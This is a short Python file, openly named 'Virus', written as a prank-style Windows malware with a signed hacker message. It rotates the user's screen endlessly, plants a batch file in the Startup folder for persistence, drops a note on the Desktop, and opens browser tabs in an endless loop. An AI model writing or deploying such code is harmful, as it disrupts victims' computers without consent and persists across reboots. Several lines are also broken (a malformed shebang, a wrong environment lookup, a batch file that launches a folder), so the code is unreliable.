#!/bin/bash/env python3
import rotatescreen
import os
from time import sleep, asctime

#---------------------------#
message = f'''
{asctime()}
Hacking is very fun 
            ---Sh4d0w_H0k4Ge
'''
#---------------------------#

class Virus:
    def __init__(self):
        self.screen = rotatescreen.get_primary_display()
        self.position = [0, 90, 180, 270]
        self.current_path, self.user = os.getcwd(), os.getlogin()
        self.persistence = f'C:\\Users\\{f"{self.user}"}' \
                           f'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        self.bat_file_persistence = f'''
@echo off 
start {self.current_path}
'''

    def rotate(self):
        while True:
            for angle in self.position:
                self.screen.rotate_to(angle)
                sleep(0.2)

    def duplicate(self):
        if "nothing_here.bat" in os.listdir(self.persistence):
            pass
        else:
            with open(f'{self.persistence}\\nothing_here.bat', "w") as file:
                file.write(self.bat_file_persistence)

    def note(self):
        if "Hacker_notes.txt" in os.listdir(f"{os.environ[f'{self.user}']}"):
            pass
        else:
            with open(f"{os.environ[f'{self.user}']}\\Desktop\\Hacker_notes.txt", "w") as rescue:
                rescue.write(message)

    def spam_browser(self):
        while True:
            os.system('start www.youtube.com')
            sleep(2)
            os.system('start www.google.com')
            sleep(2)